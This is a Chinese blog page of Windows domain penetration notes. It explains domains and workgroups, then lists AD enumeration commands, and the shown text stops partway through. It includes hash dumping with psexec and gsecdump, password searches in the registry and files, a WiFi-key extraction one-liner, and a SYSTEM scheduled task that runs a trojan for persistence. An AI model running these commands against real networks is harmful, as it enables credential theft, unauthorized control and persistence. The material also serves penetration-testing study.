<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>域渗透的整理</title>
    <meta name="description" content="收集整理的相关域渗透的命令和思路">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
    <link rel="stylesheet" href="/css/main.css ">
    <link rel="canonical" href="http://localhost:4000/2017/12/30/exploit-domain/">
    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    <script>
    // google analytics
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-111240288-1', 'auto');
      ga('send', 'pageview');

    </script>



</head>


  <body>

    <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">Jirairya</a>
        <small></small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collections/">
                        
                            <i class="fa fa-folder-open"></i>Collections
                        </a>
                    </li>
                    
                
                    
                
                    
                    <li>
                        
                        <a href="/skills/">
                        
                            <i class="fa fa-bezier-curve"></i>Skills
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tools/">
                        
                            <i class="fa fa-toolbox"></i>Tools
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-paper-plane"></i>About
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" post>
    <div class="left">
        <h1>域渗透的整理</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i>2017-12-30
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
    
        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <!--a href="/tag/#domain" title="Tag: domain" rel="tag">domain</a-->
        <a href="/tag/#domain" title="Tag: domain" rel="tag">domain</a>&nbsp;
    
        <!--a href="/tag/#windows" title="Tag: windows" rel="tag">windows</a-->
        <a href="/tag/#windows" title="Tag: windows" rel="tag">windows</a>&nbsp;
    
        <!--a href="/tag/#command" title="Tag: command" rel="tag">command</a-->
        <a href="/tag/#command" title="Tag: command" rel="tag">command</a>&nbsp;
    
        <!--a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a-->
        <a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a>
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
        <ul id="markdown-toc">
  <li><a href="#内网和域" id="markdown-toc-内网和域">内网和域</a>    <ul>
      <li><a href="#内网" id="markdown-toc-内网">内网</a></li>
      <li><a href="#域" id="markdown-toc-域">域</a></li>
      <li><a href="#域工作组家庭组" id="markdown-toc-域工作组家庭组">域、工作组、家庭组</a></li>
    </ul>
  </li>
  <li><a href="#域渗透" id="markdown-toc-域渗透">域渗透</a>    <ul>
      <li><a href="#命令" id="markdown-toc-命令">命令</a>        <ul>
          <li><a href="#net基本命令" id="markdown-toc-net基本命令">Net基本命令</a></li>
          <li><a href="#dsquery的ad查询工具" id="markdown-toc-dsquery的ad查询工具">dsquery的AD查询工具</a></li>
          <li><a href="#dos常用命令" id="markdown-toc-dos常用命令">DOS常用命令</a></li>
          <li><a href="#长命令" id="markdown-toc-长命令">长命令</a></li>
        </ul>
      </li>
      <li><a href="#定位" id="markdown-toc-定位">定位</a>        <ul>
          <li><a href="#服务器机器定位" id="markdown-toc-服务器机器定位">服务器(机器)定位</a></li>
          <li><a href="#文件定位" id="markdown-toc-文件定位">文件定位</a></li>
          <li><a href="#管理员定位" id="markdown-toc-管理员定位">管理员定位</a></li>
        </ul>
      </li>
      <li><a href="#进攻" id="markdown-toc-进攻">进攻</a>        <ul>
          <li><a href="#取得合法身份前的攻击" id="markdown-toc-取得合法身份前的攻击">取得合法身份前的攻击</a>            <ul>
              <li><a href="#认证" id="markdown-toc-认证">认证</a></li>
              <li><a href="#扫描" id="markdown-toc-扫描">扫描</a>                <ul>
                  <li><a href="#端口" id="markdown-toc-端口">端口</a></li>
                </ul>
              </li>
            </ul>
          </li>
          <li><a href="#凭据" id="markdown-toc-凭据">凭据</a>            <ul>
              <li><a href="#responder" id="markdown-toc-responder">Responder</a></li>
              <li><a href="#组策略首选项" id="markdown-toc-组策略首选项">组策略首选项</a></li>
              <li><a href="#抓hash" id="markdown-toc-抓hash">抓HASH</a>                <ul>
                  <li><a href="#get-passhashesps1" id="markdown-toc-get-passhashesps1">Get-PassHashes.ps1</a></li>
                  <li><a href="#wce" id="markdown-toc-wce">WCE</a></li>
                  <li><a href="#minikatz" id="markdown-toc-minikatz">Minikatz</a></li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#refer" id="markdown-toc-refer">Refer</a></li>
</ul>
<p>收集整理的相关域渗透的命令和思路</p>

<!--more-->

<h1 id="内网和域">内网和域</h1>

<h2 id="内网">内网</h2>

<p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>

<h2 id="域">域</h2>

<p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>

<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>

<p>域控制器可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>

<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>

<ul>
  <li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　
– 域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 
– 域：域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
</ul>

<blockquote>
  <p>域和域之间可以通过VPN等设备进行连接，并建立从属和平行的域关系</p>
</blockquote>

<h2 id="域工作组家庭组">域、工作组、家庭组</h2>

<p><strong>工作组:</strong></p>

<ul>
  <li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li>
  <li>通常情况下，计算机的数量不超过二十台。</li>
  <li>工作组不受密码保护。</li>
  <li>所有的计算机必须在同一本地网络或子网中。</li>
</ul>

<p><strong>家庭组：</strong></p>

<ul>
  <li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li>
  <li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li>
</ul>

<p><strong>域：</strong></p>

<ul>
  <li>有一台或多台计算机为服务器。网络管理员使用服务器控制域中所有计算机的安全和权限。这使得更容易进行更改，因为更改会自动应用到所有的计算机。域用户在每次访问域时必须提供密码或其他凭据。</li>
  <li>如果具有域上的用户帐户，您就可以登录到域中的任何计算机，而无需具有该计算机上的帐户。
由于网络管理员经常要确保计算机之间的一致性，所以，您也许只能对计算机的设置进行有限制地更改。</li>
  <li>一个域中可以有几千台计算机。</li>
  <li>计算机可以位于不同的本地网络中。</li>
</ul>

<hr />

<h1 id="域渗透">域渗透</h1>

<p>若直线攻击难以奏效，可以进行迂回进攻，从网络为突破，以受限用户权限开始，分析网络结构，制定对应的攻击方案，获取目标的域管理账户，逐步掌控整个网络。</p>

<h2 id="命令">命令</h2>

<p>参见:<a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a>:https://www.t00ls.net/articles-39285.html</p>

<h3 id="net基本命令">Net基本命令</h3>

<table>
  <thead>
    <tr>
      <th>命令</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="highlighter-rouge">echo %PROCESSOR_ARCHITECTURE%</code></td>
      <td>查看系统版本位数</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">set</code></td>
      <td>查看系统环境变量</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">netstat -ano</code></td>
      <td>查看开放的端口</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">netstat -an | find "3389"</code></td>
      <td>查看3389开放情况</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">ipconfig /all</code></td>
      <td>查询本机IP段，所在域等</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net config Workstation</code></td>
      <td>当前计算机名，全名，用户名，系统版本，工作站域，登陆域</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net user     </code></td>
      <td>本机用户列表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net localhroup administrators</code></td>
      <td>本机管理员[通常含有域用户]</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net user /domain</code></td>
      <td>查询域用户</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net user 用户名 /domain</code></td>
      <td>获取指定用户的账户信息</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net user /domain b404 pass</code></td>
      <td>修改域内用户密码，需要管理员权限</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net group /domain</code></td>
      <td>查询域里面的工作组</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net group 组名 /domain</code></td>
      <td>查询域中的某工作组</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net group "domain admins" /domain</code></td>
      <td>查询域管理员列表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net group "enterprise admins" /domain</code></td>
      <td>获得企业管理员列表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net group 组名 /del /domain</code></td>
      <td>删除域中的某组</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net group 组名 组成员名 /del /domain</code></td>
      <td>删除域中的某组的组成员</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net localgroup administrators /domain</code></td>
      <td>登录本机的域管理员</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net group 组名 /add</code></td>
      <td>增加域中的组</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net localgroup administrators workgroup\user001 /add</code></td>
      <td>域用户添加到本机</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net group "domain controllers" /domain</code></td>
      <td>查看域控制器(如果有多台)</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net time /domain</code></td>
      <td>判断主域，主域服务器都做时间服务器</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net config workstation </code></td>
      <td>当前登录域</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net session </code></td>
      <td>查看当前会话</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net use \\ip\ipc$ pawword /user:username@domain</code></td>
      <td>建立IPC会话[空连接-***]</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net view \\ip </code></td>
      <td>查询某IP共享</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net use z: \\192.168.200.21\文件夹名</code></td>
      <td>建立映射到本机Z盘</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net share</code></td>
      <td>查看SMB指向的路径[即共享]</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">at \\192.168.200.21:50 c:\windows\fuxk.exe</code></td>
      <td>在共享主机上执行</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net view </code></td>
      <td>查询同一域内机器列表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net view /domain </code></td>
      <td>查询域列表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net view /domain:test </code></td>
      <td>查看test域中计算机列表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net view \\DC的机器名字</code></td>
      <td>查看域控共享情况</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">nltest /domain_trusts</code></td>
      <td>获取域信任信息</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net session</code></td>
      <td>查看当前会话</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net start </code></td>
      <td>查看当前运行的服务</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net time /domain</code></td>
      <td>查询主域服务器的时间</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net time \\192.168.200.21</code></td>
      <td>查看192.168.200.21机器的时间</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">echo %logonserver%</code></td>
      <td>查看登陆到这台服务器的计算机</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net accounts </code></td>
      <td>查看本地密码策略</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">net accounts /domain</code></td>
      <td>查看域密码策略</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">nbtstat –A ip </code></td>
      <td>netbios 查询</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">netstat –an/ano/anb</code></td>
      <td>网络连接查询</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">netsh firewall show config</code></td>
      <td>查看防火墙策略</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">netsh firewall show state</code></td>
      <td>查看防火墙策略</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">route print</code></td>
      <td>路由表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">tracert IP</code></td>
      <td>路由跟踪</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">arp -a</code></td>
      <td>列出本网段内所有活跃的IP地址</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">arp -s (ip + mac)</code></td>
      <td>绑定mac和IP</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">arp -d (iP + mac)</code></td>
      <td>解绑IP和Mac</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">tasklist /V</code></td>
      <td>查看进程[显示对应用户]</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">tasklist /S ip /U domain\username /P /V </code></td>
      <td>查看远程计算机进程列表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">psexec \\192.168.200.21 -u administrator -p b404pass -c gsecdump.exe -u</code></td>
      <td>从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">gsecdump  -a</code></td>
      <td>获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">tasklist /S IP地址 /U 域名\用户名 /P /V</code></td>
      <td>查看远程计算机进程</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">tasklist /svc</code></td>
      <td>查看进程</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">taskkill /im 进程名称(cmd.exe)</code></td>
      <td>结束进程</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">taskkill /pid[进程码]</code></td>
      <td><code class="highlighter-rouge">-t(结束该进程)</code> <code class="highlighter-rouge">-f(强制结束该进程以及所有子进程)</code></td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">ping 主机名</code></td>
      <td>显示IP</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">qprocess *  </code></td>
      <td>类似tasklist</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">qprocess /SERVER:IP</code></td>
      <td>远程查看计算机进程列表</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">nslookup –qt-MX Yahoo.com </code></td>
      <td>查看邮件服务器</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">whoami /all</code></td>
      <td>查询当前用户权限等</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">set</code></td>
      <td>查看系统环境变量</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">systeminfo </code></td>
      <td>查看系统信息</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">qwinsta</code></td>
      <td>查看登录情况</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">qwinsta /SERVER:IP</code></td>
      <td>查看远程登录情况</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">fsutil fsinfo drives</code></td>
      <td>查看所有盘符</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">gpupdate /force</code></td>
      <td>更新域策略</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">whoami</code></td>
      <td>查询账号所属权限</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">whoami /all</code></td>
      <td>查看sid号</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic bios</code></td>
      <td>查看bios信息</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic qfe </code></td>
      <td>查看补丁信息</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic qfe get hotfixid</code></td>
      <td>查看补丁-Patch号，很实用</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic qfe list full /format:htable &gt; hotfixes.htm</code></td>
      <td>详细的补丁安装</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic share get name,path</code></td>
      <td>查看SMB指向路径</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic startup</code></td>
      <td>查看启动项</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic service</code></td>
      <td>查看服务</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic os</code></td>
      <td>查看OS信息</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic service list brief</code></td>
      <td>查看进程服务</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic process list brief</code></td>
      <td>查看进程</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic startup list brief </code></td>
      <td>启动程序信息</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic product list brief</code></td>
      <td>查看安装程序和版本信息（漏洞利用线索）</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic startup list full</code></td>
      <td>识别开机启动的程序</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">wmic process where(description="mysqld.exe")&gt;&gt;mysql.log</code></td>
      <td>获取软件安装路径</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dir \\DC\SYSVOL /s /a &gt; sysvol.txt</code></td>
      <td>列出sysvol日志记录</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt  /i  /e  /c</code></td>
      <td>拷贝sysvol.txt到本地</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">REG query HKCU  /v "pwd" /s</code></td>
      <td>获取到存到注册表中的密码</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dir /b/s config.*</code></td>
      <td>查看所在目录所有前缀为config的文件</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">findstr /si password *.xml *.ini *.txt</code></td>
      <td>查看后缀名文件中含有password关键字的文件</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">findstr /si login *.xml *.ini *.txt</code></td>
      <td>查看后缀名文件中含有login关键字的文件</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">copy con  ftp.bat</code></td>
      <td>创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">copy con  test.vbs</code></td>
      <td>创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</td>
    </tr>
  </tbody>
</table>

<h3 id="dsquery的ad查询工具">dsquery的AD查询工具</h3>

<table>
  <thead>
    <tr>
      <th>命令</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="highlighter-rouge">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</code></td>
      <td>列出该域内所有用户名</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dsquery server -domain super.com | dsget server -dnsname -site</code></td>
      <td>搜索域内所有域控制器并显示他们的DNS主机名和站点名称</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dsquery contact</code></td>
      <td>寻找目录中的联系人</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dsquery subnet</code></td>
      <td>列出该域内网段划分</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">query user</code></td>
      <td>查询那些用户在线</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dsquery group &amp;&amp; net group /domain</code></td>
      <td>列出该域内分组</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dsquery ou </code></td>
      <td>列出该域内组织单位</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dsquery server &amp;&amp; net time /domain</code></td>
      <td>列出该域内域控制器</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dsquery site -o rdn</code></td>
      <td>搜索域中所有站点的名称</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">dsquery group dc=super,dc=com |more</code></td>
      <td>搜索在DC=SUPER,DC=COM 域中的所有组</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">psloggedon.exe</code></td>
      <td>查询那台主机和用户登录到该主机上</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">netsess.exe //192.168.1.115</code></td>
      <td>远程主机上无需管理员权限,查询到主机名和用户</td>
    </tr>
    <tr>
      <td><code class="highlighter-rouge">reg query "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT" </code></td>
      <td>获取最近mstsc登录的记录</td>
    </tr>
  </tbody>
</table>

<h3 id="dos常用命令">DOS常用命令</h3>

<table class="inner-borders">
  <thead>
    <tr>
      <th>命令</th>
      <th>说明</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>mspaint</td>
      <td>画图工具</td>
    </tr>
    <tr>
      <td>calc</td>
      <td>计算器</td>
    </tr>
    <tr>
      <td>notepad</td>
      <td>记事本</td>
    </tr>
    <tr>
      <td>taskmgr</td>
      <td>任务管理器</td>
    </tr>
    <tr>
      <td>osk</td>
      <td>打开屏幕键盘</td>
    </tr>
    <tr>
      <td>gpedit.msc</td>
      <td>组策略</td>
    </tr>
    <tr>
      <td>services.msc</td>
      <td>本地服务</td>
    </tr>
    <tr>
      <td>compmgmt.msc</td>
      <td>计算机管理</td>
    </tr>
    <tr>
      <td>devmgmt.msc</td>
      <td>设备管理器</td>
    </tr>
    <tr>
      <td>winver</td>
      <td>查看系统版本</td>
    </tr>
    <tr>
      <td>magnify</td>
      <td>放大镜实用程序</td>
    </tr>
    <tr>
      <td>eventvwr</td>
      <td>事件查看器</td>
    </tr>
    <tr>
      <td>Regedit</td>
      <td>打开注册表</td>
    </tr>
    <tr>
      <td>resmon</td>
      <td>资源监视器</td>
    </tr>
    <tr>
      <td>WMIC BIOS get releasedate</td>
      <td>查看电脑生产日期</td>
    </tr>
    <tr>
      <td>mstsc -f</td>
      <td>远程连接（可以全屏）</td>
    </tr>
  </tbody>
</table>

<h3 id="长命令">长命令</h3>

<p>一键获取WiFI密码：**</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> /f <span class="s2">"skip=9 tokens=1,2 delims=:"</span> %i <span class="k">in</span> <span class="o">(</span><span class="s1">'netsh wlan showprofiles'</span><span class="o">)</span> <span class="k">do</span> @echo%j | findstr <span class="nt">-i</span> <span class="nt">-v</span> <span class="nb">echo</span> | netsh wlan show profiles %jkey<span class="o">=</span>clear
</code></pre></div></div>

<p>查看是否支持PowerShell：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span>defined PSModulePath <span class="o">(</span><span class="nb">echo </span>support powershell<span class="o">)</span> <span class="k">else</span> <span class="o">(</span><span class="nb">echo </span>not support powershell<span class="o">)</span>
</code></pre></div></div>

<p>添加任务计划：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks.exe  /Create /RU<span class="s2">"SYSTEM"</span> /SC MINUTE /MO 45 /TN FIREWALL /TR <span class="s2">"c:/muma.ex    e"</span> /ED 2017/12/31
</code></pre></div></div>

<p>nbtscan扫描整个网络:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nbtscan <span class="nt">-r</span> 192.168.200.0/24
</code></pre></div></div>

<p>ping 扫描内网存活主机：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> /l %i <span class="k">in</span> <span class="o">(</span>1,1,255<span class="o">)</span> <span class="k">do</span> @ping 192.168.200.%i <span class="nt">-w</span> 1 <span class="nt">-n</span> 1 | find /i<span class="s2">"ttl"</span>
</code></pre></div></div>

<p>域机器对应的IP:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FOR /F <span class="s2">"eol=- tokens=1 delims=</span><span class="se">\ </span><span class="s2">"</span> %a IN<span class="o">(</span><span class="s1">'net view'</span><span class="o">)</span> DO @<span class="o">(</span><span class="nb">echo </span>name: %a, ip: &amp; ping %a <span class="nt">-w</span> 1 <span class="nt">-n</span> 1 | find /i <span class="s2">"ttl"</span> &amp; echo.<span class="o">)</span>
</code></pre></div></div>

<p>找主机名：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> /l %i <span class="k">in</span> <span class="o">(</span>1,1,255<span class="o">)</span> <span class="k">do</span> @ping <span class="nt">-a</span> 192.168.200.%i <span class="nt">-w</span> 1 <span class="nt">-n</span> 1 | find /i <span class="s2">"Pinging"</span>
</code></pre></div></div>

<p>找B段：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> /l %i <span class="k">in</span> <span class="o">(</span>1,1,255<span class="o">)</span> <span class="k">do</span> @ping <span class="nt">-a</span> 10.0.%i.1 <span class="nt">-w</span> 1 <span class="nt">-n</span> 1 | find /i <span class="s2">"Pinging"</span>
</code></pre></div></div>
<blockquote>
  <p>将<code class="highlighter-rouge">Pinging</code>改成<code class="highlighter-rouge">Ping</code>就可以适用于Win7</p>
</blockquote>

<h2 id="定位">定位</h2>

<ul>
  <li>收集域以及域内用户信息</li>
  <li>收集域内域控制器信息</li>
  <li>收集域控上域用户登录日志信息</li>
  <li>收集域内所有用户名以及全名、备注等信息</li>
  <li>收集域内工作组信息</li>
  <li>收集域管理员帐号信息</li>
  <li>收集域内网段划分信息</li>
  <li>收集域内组织单位信息</li>
</ul>

<h3 id="服务器机器定位">服务器(机器)定位</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>不管是做外网还是内网，信息收集都是很有必要的第一步，当我们控下一台机器的时候，内网是个什么结构？这台机器是一个什么角色？使用机器的人是一个什么角色？上面装的什么杀毒？机器是怎么上网的？机器是笔记本，还是台式机？等等等等。。。

ipconfig /all     
//用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。

net view         
//用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.

net view /domain
//用来查看当前网络环境存在几个域.

net view /domain:xxxx
//查看xxx域中存在的跟本机有关联的机器.

